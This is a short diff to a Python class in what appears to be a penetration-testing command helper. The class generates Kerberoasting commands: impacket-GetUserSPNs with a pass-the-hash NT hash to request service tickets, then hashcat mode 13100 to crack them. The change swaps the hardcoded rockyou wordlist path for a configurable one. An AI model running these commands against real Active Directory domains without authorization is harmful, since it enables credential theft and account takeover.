@@ -11,6 +11,7 @@ class CommandImpacketGetUserSPNs(Command):
         self.defaultUsername = conf['username']
         self.defaultPassword = conf['password']
         self.defaultNtHash = conf['ntHash']
+        self.defaultWordlist = config['wordlists']['rockyou']
 
 
     def matchesTrigger(self, trigger : str) -> bool:
@@ -42,5 +43,5 @@ class CommandImpacketGetUserSPNs(Command):
         commands.append(f"impacket-GetUserSPNs {dom}/{user} -hashes :{ntHash} -dc-ip {dcIp} -request -outputfile {outputfile}")
         commands.append('')
         commands.append('# Crack')
-        commands.append(f'hashcat -m 13100 {outputfile} /usr/share/wordlists/rockyou.txt -O')
+        commands.append(f'hashcat -m 13100 {outputfile} {self.defaultWordlist} -O')
         return commands
